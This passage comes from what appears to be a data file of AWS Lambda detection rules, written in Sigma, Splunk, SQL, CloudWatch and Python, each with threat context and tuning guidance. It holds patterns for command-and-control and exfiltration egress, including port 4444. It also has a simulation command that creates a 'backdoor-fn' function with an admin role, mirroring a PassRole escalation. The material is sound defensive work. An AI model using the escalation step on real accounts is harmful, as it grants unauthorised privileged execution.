    relatedServices: ["EC2"],
    severity: "High",
    tags: ["Lambda", "Persistence", "Network"],
    logSources: ["VPC Flow Logs", "Lambda Logs"],
    falsePositives: ["Lambda functions that legitimately call external APIs"],
    rules: {
      sigma: `title: Lambda Internet Egress to Unapproved or Suspicious Destination
status: experimental
logsource:
  product: aws
  service: vpcflow
detection:
  selection_egress:
    flowDirection: egress
    action: ACCEPT
  selection_lambda:
    interfaceId|startswith: eni-
  suspicious_port:
    dstPort:
      - 4444
      - 8080
      - 8443
  condition: selection_egress and selection_lambda and suspicious_port
level: high`,
      splunk: `index=aws sourcetype=aws:cloudwatchlogs:vpcflow
| lookup lambda_eni_mapping interfaceId OUTPUT functionName, approvedDestinations
| where isnotnull(functionName)
| where flowDirection="egress" AND action="ACCEPT"
| where NOT cidrmatch("10.0.0.0/8", dstAddr) AND NOT cidrmatch("172.16.0.0/12", dstAddr) AND NOT cidrmatch("192.168.0.0/16", dstAddr)
| stats sum(bytes) as total_bytes count by functionName, dstAddr, dstPort
| where dstPort IN (4444,8080,8443) OR total_bytes > 10485760`,
      cloudtrail: `SELECT interfaceId, srcAddr, dstAddr, dstPort, protocol, bytes
FROM vpc_flow_logs
WHERE interfaceId IN (SELECT interface_id FROM lambda_eni_mapping)
  AND flowDirection = 'egress'
  AND action = 'ACCEPT'
  AND dstAddr NOT LIKE '10.%'
  AND dstAddr NOT LIKE '172.16.%'
  AND dstAddr NOT LIKE '192.168.%'
  AND (dstPort IN (4444, 8080, 8443) OR bytes > 10485760)
ORDER BY start_time DESC`,
      cloudwatch: `fields @timestamp, interfaceId, srcAddr, dstAddr, dstPort, bytes, action, flowDirection
| filter action = "ACCEPT"
| filter flowDirection = "egress"
| filter dstAddr not like /^10\\./ and dstAddr not like /^172\\.(1[6-9]|2[0-9]|3[0-1])\\./ and dstAddr not like /^192\\.168\\./
| stats sum(bytes) as total_bytes, count(*) as connections by interfaceId, dstAddr, dstPort
| filter dstPort in [4444, 8080, 8443] or total_bytes > 10485760`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["VPC Flow Log"], detail: { action: ["ACCEPT"] } }, null, 2),
      lambda: `"""
Lambda Internet Egress to Unapproved or Suspicious Destination
Trigger: VPC Flow Logs delivered to a Lambda analytics pipeline.
Use for: Stateful or streaming analytics over Lambda-attributed egress traffic.
"""

PRIVATE_PREFIXES = ("10.", "192.168.")
SUSPICIOUS_PORTS = {4444, 8080, 8443}

def lambda_handler(event, context):
    record = event.get("detail", event)
    interface_id = record.get("interfaceId", "")
    dst_addr = record.get("dstAddr", "")
    dst_port = int(record.get("dstPort", 0) or 0)
    bytes_sent = int(record.get("bytes", 0) or 0)

    if record.get("action") != "ACCEPT" or record.get("flowDirection") != "egress":
        return {"matched": False}
    if not interface_id.startswith("eni-"):
        return {"matched": False}
    if dst_addr.startswith(PRIVATE_PREFIXES) or dst_addr.startswith("172.16."):
        return {"matched": False}
    if dst_port not in SUSPICIOUS_PORTS and bytes_sent <= 10485760:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-005",
            "title": "Lambda Internet Egress to Unapproved or Suspicious Destination",
            "severity": "High",
            "interface_id": interface_id,
            "destination_ip": dst_addr,
            "destination_port": dst_port,
            "bytes": bytes_sent,
        },
    }
`,
    },
    relatedAttackSlugs: ["lambda-persistence", "lambda-privilege-escalation"],
    telemetry: { primaryLogSource: "VPC Flow Logs", generatingService: "vpcflowlogs.amazonaws.com", importantFields: ["srcAddr", "dstAddr", "dstPort", "protocol", "bytes"], exampleEvent: JSON.stringify({ version: "2", accountId: "123456789012", interfaceId: "eni-xxx", srcAddr: "10.0.1.50", dstAddr: "93.184.216.34", dstPort: 443, protocol: 6, packets: 1, bytes: 150 }, null, 2) },
    investigationSteps: ["Correlate srcAddr with Lambda ENI IPs.", "Identify which Lambda function made the external connection.", "Verify if the destination is an approved external API.", "Review Lambda function code for data exfiltration."],
    testingSteps: ["Deploy a Lambda that calls an external API.", "Ensure VPC Flow Logs capture the traffic.", "Run the detection to confirm it triggers on non-RFC1918 destinations."],
    lifecycle: {
      whyItMatters: "Outbound internet access from Lambda is common for SaaS integrations and webhooks, but it is also a practical channel for command-and-control, payload retrieval, and data exfiltration. This detection is only production-worthy when it can attribute the flow to a Lambda workload and distinguish approved business egress from unapproved or suspicious destinations.",
      threatContext: {
        attackerBehavior: "An attacker who gains code execution in Lambda, updates a function's code or layer, or repurposes an existing function can use outbound network access to reach attacker-controlled infrastructure. Common follow-on behavior includes beaconing to C2, downloading second-stage payloads, and sending secrets or records to external services.",
        realWorldUsage: "In serverless intrusions, outbound traffic is more often a post-compromise behavior than a standalone signal: malicious code in functions or layers commonly calls webhooks, paste sites, object stores, or transient cloud hosts. Defenders usually get better results from a combination of destination allowlisting, threat-intel enrichment, and first-seen or unusual-destination analytics rather than a simple any-external-IP rule.",
        whyItMatters: "CloudTrail records Lambda configuration changes and invokes, but it does not tell you which remote internet destinations the function contacted. If a compromised Lambda can reach arbitrary external infrastructure, it can quietly exfiltrate data or maintain remote control while blending into otherwise normal HTTPS traffic.",
        riskAndImpact: "If this behavior goes undetected, attackers can exfiltrate secrets, customer data, or application outputs from highly automated workflows and use Lambda as a durable outbound execution point that inherits trusted IAM permissions.",
      },
      telemetryValidation: {
        requiredLogSources: ["Amazon VPC Flow Logs for the subnets or ENIs used by VPC-attached Lambda functions", "Lambda function inventory/configuration from AWS Lambda APIs or AWS Config", "EC2 network-interface inventory (DescribeNetworkInterfaces) or an equivalent ENI mapping cache"],
        requiredFields: ["interfaceId", "srcAddr", "dstAddr", "pktDstAddr", "dstPort", "protocol", "bytes", "action", "flowDirection", "trafficPath", "pktDstAwsService", "start", "end"],
        loggingRequirements: ["The function must be VPC-attached; non-VPC Lambda egress is not visible in VPC Flow Logs.", "Enable VPC Flow Logs with a custom format so you capture interface-id, flow-direction, traffic-path, pkt-dstaddr, and pkt-dst-aws-service.", "Use a 1-minute maximum aggregation interval if you want practical detection latency.", "Maintain a current Lambda-to-subnet/security-group inventory and an ENI mapping cache so flow records can be attributed to Lambda-owned ENIs."],
        limitations: ["This detection does not cover Lambda functions that are not attached to a customer VPC.", "Hyperplane ENIs can be shared by multiple functions with the same subnet/security-group combination, so ENI-only attribution may be ambiguous.", "VPC Flow Logs contain IPs and ports, not DNS names; hostname-aware allowlisting needs Resolver logs, a proxy, or function-level telemetry.", "Legitimate SaaS/API traffic often uses the same ports and protocols as suspicious egress, especially TCP/443."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "interfaceId", normalizedPath: "cloud.network.interface.id", notes: "Primary join key to ENI inventory and Lambda attribution cache" },
          { rawPath: "srcAddr", normalizedPath: "source.ip", notes: "Private IP of the observed ENI for egress flows" },
          { rawPath: "dstAddr", normalizedPath: "destination.ip", notes: "Observed destination from the ENI perspective" },
          { rawPath: "dstPort", normalizedPath: "destination.port", notes: "Common discriminator for web/API traffic versus unusual egress" },
          { rawPath: "bytes", normalizedPath: "network.bytes", notes: "Useful for exfiltration size and baseline modeling" },
          { rawPath: "flowDirection", normalizedPath: "network.direction", notes: "Filter to egress for this rule" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2026-03-17T12:45:00Z",
          event: { category: ["network"], type: ["connection", "allowed"], action: "lambda_unapproved_external_egress", outcome: "success", provider: "aws" },
          cloud: { provider: "aws", region: "us-east-1", account: { id: "123456789012" } },
          source: { ip: "10.0.12.45" },
          destination: { ip: "198.51.100.24", port: 443, classification: "unknown" },
          network: { direction: "egress", transport: "tcp", iana_number: 6, bytes: 187452 },
          cloud_network: { interface: { id: "eni-0abc123def456" } },
          lambda: { function: { name: "payments-webhook-worker", arn: "arn:aws:lambda:us-east-1:123456789012:function:payments-webhook-worker" } },
          user: { effective: { arn: "arn:aws:iam::123456789012:role/payments-webhook-role" } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Function Context", description: "Adds business ownership, environment, execution role, runtime, deployment timestamp, and declared outbound dependencies for the Lambda function.", examples: ["Function tags: service=payments, env=prod, owner=platform-payments", "Execution role ARN and attached policies", "LastModified timestamp for recent code or layer changes"], falsePositiveReduction: "Lets you distinguish a webhook processor that is expected to reach third-party APIs from a function that should only talk to AWS services or internal resources." },
        { dimension: "Destination Intelligence", description: "Classifies the remote endpoint using approved registries, AWS service ranges, ASN ownership, geolocation, domain age, and threat-intelligence verdicts.", examples: ["Approved destination registry keyed by function or service", "AWS ip-ranges or pkt-dst-aws-service enrichment for service endpoints", "Threat intel hits for Tor or known malware infrastructure"], falsePositiveReduction: "Separates approved SaaS/API egress from unknown or high-risk infrastructure instead of treating all public IPs equally." },
        { dimension: "Egress Architecture", description: "Adds routing and control-plane context such as NAT gateway, gateway endpoints, subnet tags, and security-group intent.", examples: ["traffic-path indicates internet gateway versus same-VPC routing", "Subnet tags: private-egress, app, data", "Security group intent: allow only Stripe and Snowflake egress"], falsePositiveReduction: "Prevents expected AWS-service or approved egress-path traffic from looking like generic internet access." },
        { dimension: "Behavioral Baselines", description: "Compares current destinations, ports, byte volume, and timing to normal behavior for the function, service, and environment.", examples: ["First-seen destination for this function", "New external ASN for this workload", "Outbound volume 20x higher than normal"], falsePositiveReduction: "Makes rare or novel egress stand out while suppressing repetitive, known-good integrations." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not page on every Lambda connection to a public IP. In production, it should start by attributing egress flow records to VPC-attached Lambda workloads, then classify the destination as approved, expected AWS service traffic, unknown, or suspicious. The alert should fire only when internet-bound traffic is unapproved for that function or has independent risk indicators such as threat-intel hits, first-seen destination, unusual port, or abnormal volume. Keep the broad any-external-egress query as a hunt or dashboard, and reserve alerting for unapproved or suspicious destinations with confident Lambda attribution.",
        conditions: ["VPC Flow Log record has action = ACCEPT", "VPC Flow Log record has flowDirection = egress", "interfaceId maps to a Lambda-attributed ENI with medium or high confidence", "Destination is external to approved private/internal ranges and is not suppressed as expected AWS service traffic", "At least one risk condition is true: destination not in approved registry, destination has suspicious reputation, destination is first-seen for this function, destination port is unusual for the workload, or byte volume materially exceeds baseline"],
        tuningGuidance: "1. Build an approved destination registry per function, service, or environment. 2. Suppress expected AWS service traffic using VPC endpoints, AWS IP ranges, and pkt-dst-aws-service enrichment. 3. Improve attribution by segmenting sensitive functions into distinct subnet/security-group combinations. 4. Treat generic internet egress as informational unless there is destination risk, novelty, or strong policy violation.",
        whenToFire: "Fire as an analyst-worthy alert when a VPC-attached Lambda function reaches an external destination that is not approved for that workload or is independently suspicious. In mature environments this should be low to moderate volume; if alerts are dominated by common SaaS/API destinations, the allowlist registry is incomplete.",
      },
      simulationCommand: "aws lambda invoke --function-name vpc-egress-lab --payload '{\"url\":\"https://api.ipify.org\"}' /tmp/lambda-egress-output.json",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium without destination registry; Low to Medium once approved-destination and AWS-service suppression are in place",
        expectedVolume: "Org-dependent; low in tightly controlled environments, moderate in API-heavy serverless estates",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["CloudWatch Logs subscription on VPC Flow Logs -> Lambda/Kinesis analytics pipeline", "Athena over centralized VPC Flow Logs in S3", "Splunk", "Panther", "Datadog", "Chronicle", "Elastic"],
        scheduling: "Streaming preferred for detection; expect practical latency of 1-5 minutes with Flow Logs plus ingestion. Batch analytics every 5-15 minutes is acceptable for lower-sensitivity environments.",
        considerations: ["Do not model this as native EventBridge-only detection; VPC Flow Logs are typically consumed from CloudWatch Logs, S3, Kinesis, or a SIEM pipeline.", "Custom Flow Log format is mandatory if you want routing and AWS-service context.", "This rule only works for VPC-attached Lambda functions; document that coverage gap explicitly.", "Destination registry ownership is a process requirement, not just a query requirement."],
      },
    },
  },
  {
    id: "det-012",
    title: "Lambda Function Created with Admin Role",
    description: "Detects creation of Lambda functions with overly permissive execution roles.",
    awsService: "Lambda",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["Lambda", "Privilege Escalation", "PassRole"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate deployment pipelines"],
    rules: {
      sigma: `title: Lambda Created with Admin Role
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: lambda.amazonaws.com
    eventName: CreateFunction20150331
  high_risk_role:
    requestParameters.role|contains:
      - 'Admin'
      - 'AdministratorAccess'
      - 'PowerUser'
      - 'OrganizationAccountAccessRole'
      - 'Security'
  condition: selection and high_risk_role
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=lambda.amazonaws.com eventName=CreateFunction20150331
| where like(requestParameters.role, "%AdministratorAccess%") OR like(requestParameters.role, "%Admin%") OR like(requestParameters.role, "%PowerUser%") OR like(requestParameters.role, "%OrganizationAccountAccessRole%") OR like(requestParameters.role, "%Security%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.role, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.role, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'lambda.amazonaws.com'
  AND eventName = 'CreateFunction20150331'
  AND (
    requestParameters.role LIKE '%Admin%'
    OR requestParameters.role LIKE '%AdministratorAccess%'
    OR requestParameters.role LIKE '%PowerUser%'
    OR requestParameters.role LIKE '%OrganizationAccountAccessRole%'
    OR requestParameters.role LIKE '%Security%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.role, sourceIPAddress
| filter eventSource = "lambda.amazonaws.com"
| filter eventName = "CreateFunction20150331"
| filter requestParameters.role like /Admin|AdministratorAccess|PowerUser|OrganizationAccountAccessRole|Security/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.lambda"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["lambda.amazonaws.com"], eventName: ["CreateFunction20150331"] } }, null, 2),
      lambda: `"""
Lambda Function Created with Admin Role
Trigger: EventBridge rule matching CloudTrail CreateFunction20150331 events.
Use for: Real-time alerting on Lambda creation with high-risk execution roles.
"""

HIGH_RISK_ROLE_MARKERS = ("Admin", "AdministratorAccess", "PowerUser", "OrganizationAccountAccessRole", "Security")

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "lambda.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "CreateFunction20150331":
        return {"matched": False}

    role_arn = detail.get("requestParameters", {}).get("role", "")
    if not any(marker in role_arn for marker in HIGH_RISK_ROLE_MARKERS):
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-012",
            "title": "Lambda Function Created with Admin Role",
            "severity": "Critical",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "function_name": detail.get("requestParameters", {}).get("functionName"),
            "role_arn": role_arn,
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["aws-passrole-abuse", "lambda-privilege-escalation"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "lambda.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.role", "requestParameters.functionName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "lambda.amazonaws.com", eventName: "CreateFunction20150331", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { functionName: "my-function", role: "arn:aws:iam::123456789012:role/AdministratorAccess" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who created the Lambda and which role was passed.", "Inspect the role for AdministratorAccess or similar.", "Verify if the creation was from a deployment pipeline.", "Review Lambda execution history for suspicious invocations."],
    testingSteps: ["Create a Lambda with a role containing 'Admin' or 'AdministratorAccess'.", "Observe CloudTrail CreateFunction event.", "Run the detection query to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Creating a Lambda function is common; creating one with a materially over-privileged execution role is not. This is a classic hidden PassRole escalation path because the dangerous action is embedded inside CreateFunction.",
      threatContext: {
        attackerBehavior: "An attacker with lambda:CreateFunction and iam:PassRole can create a new Lambda function and attach a powerful execution role. Once the function is invoked, the attacker gains code execution under that role's permissions, which can provide administrative access, secret retrieval, or access to sensitive data stores.",
        realWorldUsage: "PassRole abuse through service creation is a well-established AWS privilege-escalation pattern in red-team tradecraft, pentest writeups, and cloud attack-path research. Lambda is one of the most practical abuse paths because it lets an attacker operationalize a more privileged role immediately.",
        whyItMatters: "This event should be treated as high signal when the execution role being attached is classified as high risk, especially if the caller is not part of an approved deployment workflow.",
        riskAndImpact: "If missed, the attacker can gain durable execution under a stronger role, access secrets or KMS-protected data, modify IAM or logging controls, and establish serverless persistence.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for Lambda)", "IAM role inventory for role sensitivity enrichment"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.functionName", "requestParameters.role", "sourceIPAddress", "awsRegion", "recipientAccountId", "eventTime"],
        loggingRequirements: ["CloudTrail management events must be enabled for Lambda API activity.", "The pipeline must preserve requestParameters.role because the passed execution role ARN lives there.", "Maintain an enrichment table that classifies IAM roles by effective privilege and business sensitivity."],
        limitations: ["CloudTrail does not emit iam:PassRole as a separate API event; the detection must infer role passing from CreateFunction.", "High-fidelity alerting depends on role sensitivity enrichment; raw role-name matching is only a fallback.", "This covers new function creation, not later role changes through UpdateFunctionConfiguration."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail service that handled the request" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Lambda CreateFunction API action" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Caller identity" },
          { rawPath: "requestParameters.functionName", normalizedPath: "aws.lambda.function.name", notes: "New Lambda function name" },
          { rawPath: "requestParameters.role", normalizedPath: "aws.iam.passed_role.arn", notes: "Execution role attached during CreateFunction" },
          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Network origin of the request" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["change"], action: "CreateFunction20150331", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { lambda: { function: { name: "my-function" } }, iam: { passed_role: { arn: "arn:aws:iam::123456789012:role/AdministratorAccess" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Execution Role Sensitivity", description: "Classify the passed role by attached permissions, allowed actions, and whether it grants administrative, secrets, IAM, KMS, or security-tool access.", examples: ["Role has AdministratorAccess attached", "Role can call iam:* or organizations:*", "Role can access secretsmanager:GetSecretValue"], falsePositiveReduction: "Separates genuinely dangerous role delegation from ordinary low-privilege function deployments." },
        { dimension: "Identity Context", description: "Add ownership and identity metadata for the caller to determine whether the actor is expected to deploy Lambda functions with sensitive roles.", examples: ["SSO permission set name", "CI/CD bot inventory", "Session issuer ARN for assumed roles"], falsePositiveReduction: "Suppresses approved deployment identities while escalating developer, workload, or unusual assumed-role activity." },
        { dimension: "Deployment Provenance", description: "Track whether the function creation came from an approved pipeline, IaC system, or known deployment account.", examples: ["Created by Terraform runner", "CodePipeline execution ID", "Known deployment account"], falsePositiveReduction: "Makes routine platform deployments easier to suppress without losing high-risk ad hoc creations." },
        { dimension: "Behavioral Baseline", description: "Measure whether the caller has previously created functions or passed this role before.", examples: ["First time this actor used CreateFunction", "First time this role was passed to Lambda", "Out-of-hours deployment"], falsePositiveReduction: "Raises priority when the event is novel for the identity or environment." },
      ],
      logicExplanation: {
        humanReadable: "This detection identifies Lambda CreateFunction requests where the passed execution role is classified as high risk, rather than relying only on fragile role-name keywords. The correct engineering approach is to inspect requestParameters.role from the Lambda API event and enrich that ARN with authoritative IAM role sensitivity data such as attached policies, privilege level, and access to security-critical services.",
        conditions: ["eventSource equals lambda.amazonaws.com", "eventName equals CreateFunction20150331", "requestParameters.role exists", "passed execution role is classified as high risk by enrichment or policy analysis"],
        tuningGuidance: "1. Replace simple string matching with a maintained role-sensitivity inventory built from IAM policy analysis. 2. Allowlist approved CI/CD, Terraform, CloudFormation, and platform deployment identities. 3. Increase severity when the passed role enables IAM, Secrets Manager, KMS, cross-account access, or production data access.",
        whenToFire: "Fire when a Lambda function is created with a role classified as high risk, especially in production accounts or when performed by a developer, workload role, or unusual source IP.",
      },
      simulationCommand: "aws lambda create-function --function-name backdoor-fn --runtime python3.12 --handler lambda_function.lambda_handler --zip-file fileb://function.zip --role arn:aws:iam::123456789012:role/AdminRole",
      quality: {
        signalQuality: 9,
        falsePositiveRate: "Low-Medium (mostly approved platform deployment activity after actor and role-sensitivity tuning)",
        expectedVolume: "Low in mature environments; bursty during deployment windows",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query with IAM role enrichment)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda enrichment function"],
        scheduling: "Batch: every 5-15 minutes in Athena or SIEM pipelines. Real-time: EventBridge on CreateFunction20150331 with downstream enrichment of the passed role ARN.",
        considerations: ["This rule is substantially better when role sensitivity is computed from IAM policies instead of inferred from role names.", "Preserve requestParameters.role through parsing and normalization.", "Pair with detections for UpdateFunctionConfiguration, UpdateFunctionCode, and unusual Lambda invocation to catch full abuse chains."],
      },
    },
  },
  {
    id: "det-013",
    title: "Lambda Event Source Mapping Created",
    description: "Detects new Lambda event source mappings which could be used for persistence via trigger-based execution.",
    awsService: "Lambda",
    relatedServices: ["DynamoDB", "S3"],
    severity: "Medium",
    tags: ["Lambda", "Persistence", "Event Source"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate application deployments"],
    rules: {
      sigma: `title: Lambda Event Source Mapping Created
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: lambda.amazonaws.com
    eventName: CreateEventSourceMapping
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=CreateEventSourceMapping
| table _time, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.eventSourceArn, requestParameters.enabled, requestParameters.batchSize, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.eventSourceArn, requestParameters.enabled, requestParameters.batchSize, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'lambda.amazonaws.com'
  AND eventName = 'CreateEventSourceMapping'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.eventSourceArn, requestParameters.enabled, requestParameters.batchSize, sourceIPAddress
| filter eventSource = "lambda.amazonaws.com"
| filter eventName = "CreateEventSourceMapping"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.lambda"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["lambda.amazonaws.com"], eventName: ["CreateEventSourceMapping"] } }, null, 2),
      lambda: `"""
Lambda Event Source Mapping Created
Trigger: EventBridge rule matching CloudTrail CreateEventSourceMapping events.
Use for: Real-time enrichment of new source-to-function relationships.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "lambda.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "CreateEventSourceMapping":
        return {"matched": False}

    return {
        "matched": "requires-enrichment",
        "alert": {
            "rule_id": "det-013",
            "title": "Lambda Event Source Mapping Created",
            "severity": "Medium",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "function_name": detail.get("requestParameters", {}).get("functionName"),
            "event_source_arn": detail.get("requestParameters", {}).get("eventSourceArn"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["lambda-persistence"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "lambda.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.functionName", "requestParameters.eventSourceArn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "lambda.amazonaws.com", eventName: "CreateEventSourceMapping", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { functionName: "my-function", eventSourceArn: "arn:aws:dynamodb:us-east-1:123456789012:table/MyTable/stream/xxx" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the Lambda and event source (DynamoDB, S3, etc.).", "Verify if the mapping was part of a legitimate deployment.", "Review the Lambda's execution role and triggers.", "Check for persistence via scheduled or event-driven execution."],
    testingSteps: ["Create an event source mapping (e.g., DynamoDB stream to Lambda).", "Verify CloudTrail captures CreateEventSourceMapping.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Creating an event source mapping establishes a durable auto-execution path between a data source and Lambda. The important signal is not every mapping creation, but mappings that are unexpected for the actor, the function, or the source resource.",
      threatContext: {
        attackerBehavior: "An attacker with lambda:CreateEventSourceMapping can attach a Lambda function they control, or a legitimate function they have modified, to a queue or stream such as SQS, DynamoDB Streams, or Kinesis. This gives them trigger-based execution whenever new records arrive and can quietly wire malicious or repurposed code into an existing event-driven workflow.",
        realWorldUsage: "Serverless persistence and trigger abuse are common in cloud attack-path research and red-team operations because integration changes often receive less scrutiny than IAM or compute changes.",
        whyItMatters: "A new mapping can fundamentally change what code executes in response to business events. If the mapping links a sensitive stream or queue to an unexpected function, defenders can miss both the persistence mechanism and the downstream data exposure.",
        riskAndImpact: "Undetected malicious mappings can enable covert persistence, unauthorized invocation on every new event, exfiltration of records from queues or streams, and operational disruption by redirecting or over-consuming production event flows.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for Lambda)", "Configuration inventory for approved function-to-source relationships"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.functionName", "requestParameters.eventSourceArn", "requestParameters.enabled", "requestParameters.startingPosition", "requestParameters.batchSize", "sourceIPAddress", "awsRegion", "recipientAccountId", "eventTime"],
        loggingRequirements: ["CloudTrail management events must be enabled for Lambda API activity.", "The pipeline must preserve requestParameters.eventSourceArn and requestParameters.functionName.", "Maintain an inventory of approved source-to-function mappings and approved deployer identities."],
        limitations: ["CreateEventSourceMapping covers streams, queues, and Kafka-style sources, but not all Lambda trigger types such as S3 notifications or EventBridge rules.", "UpdateEventSourceMapping is a separate API and should be covered independently.", "CloudTrail alone cannot determine whether the new mapping is expected; baseline and ownership context are required for high fidelity."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail service that received the request" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Lambda event source mapping API action" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Caller identity" },
          { rawPath: "requestParameters.functionName", normalizedPath: "aws.lambda.function.name", notes: "Lambda function receiving records from the mapping" },
          { rawPath: "requestParameters.eventSourceArn", normalizedPath: "aws.lambda.event_source.arn", notes: "Queue, stream, or Kafka source connected to the function" },
          { rawPath: "requestParameters.batchSize", normalizedPath: "aws.lambda.event_source.batch_size", notes: "Can indicate operational intent or abuse" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "CreateEventSourceMapping", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { lambda: { function: { name: "my-function" }, event_source: { arn: "arn:aws:dynamodb:us-east-1:123456789012:table/MyTable/stream/xxx", batch_size: 100 } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Identity Context", description: "Classify the caller by role family, ownership, deployment authority, and whether the identity is approved to manage Lambda triggers.", examples: ["CI/CD runner role", "Terraform execution role", "Developer SSO permission set"], falsePositiveReduction: "Suppresses approved deployment workflows and elevates mappings created by unexpected human or workload identities." },
        { dimension: "Function Criticality", description: "Add business ownership, environment, execution role sensitivity, and whether the target function is production or security-relevant.", examples: ["Function tags: env=prod", "Execution role can access customer data", "Recently modified function code"], falsePositiveReduction: "Prioritizes mappings that attach new triggers to sensitive or high-impact functions." },
        { dimension: "Source Resource Context", description: "Classify the event source by service type, data sensitivity, owner, and whether the source ARN is approved for this function.", examples: ["DynamoDB stream for CustomerPII table", "SQS dead-letter queue", "Kinesis stream owned by a different team"], falsePositiveReduction: "Distinguishes normal app wiring from suspicious linkage to sensitive or cross-team data sources." },
        { dimension: "Relationship Baseline", description: "Track whether this exact source-to-function pair or actor has been seen before.", examples: ["First time this function was mapped to any DynamoDB stream", "First time this source ARN was used with Lambda", "Change occurred outside normal release window"], falsePositiveReduction: "Turns a noisy API event into a novelty-based detection that highlights unexpected integrations." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not alert on every CreateEventSourceMapping event because application teams legitimately create mappings during normal deployments. The better approach is to treat the CloudTrail API call as the starting point and then alert only when the new source-to-function relationship is suspicious: the actor is not an approved deployer, the mapping is novel for the environment, or the source or target is sensitive.",
